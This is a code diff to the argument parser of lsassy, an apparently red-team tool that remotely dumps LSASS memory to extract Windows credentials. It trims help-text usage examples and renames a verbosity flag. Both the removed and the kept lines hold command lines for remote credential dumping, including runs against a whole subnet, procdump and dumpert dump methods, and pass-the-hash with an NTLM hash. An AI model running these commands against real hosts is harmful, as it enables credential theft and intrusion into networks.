@@ -16,28 +16,8 @@ version = pkg_resources.require("lsassy")[0].version
 
 
 def get_args():
-    examples = '''examples:
-    ** Multiple hosts **
+    examples = '''example:
     lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
-    
-    ** RunDLL Dump Method **
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local
-    
-    ** Try all methods **
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 0 
-    
-    ** Procdump Dump Method **
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 2 --procdump /tmp/procdump.exe
-    
-    ** dumpert Dump Method **
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 5 --dumpert /tmp/dumpert.exe
-    
-    ** Hash authentication **
-    sassy -d adsec.local -u pixis -H 7659B2FE69975DD2AF6F06EA73F6DF82 dc01.adsec.local
-         
-    ** Output functions **
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local --format json
-    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -o /path/to/output/file.txt
     '''
 
     parser = argparse.ArgumentParser(
@@ -73,7 +53,7 @@ def get_args():
 
     parser.add_argument('-r', '--raw', action='store_true',
                         help='No basic result filtering (Display host credentials, duplicates and empty pass)')
-    parser.add_argument('-v', '--verbose', action='count', default=0, help='Verbosity level (0-2)')
+    parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
     parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
     parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
     parser.add_argument('target', nargs='*', type=str, action='store', help='The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets')
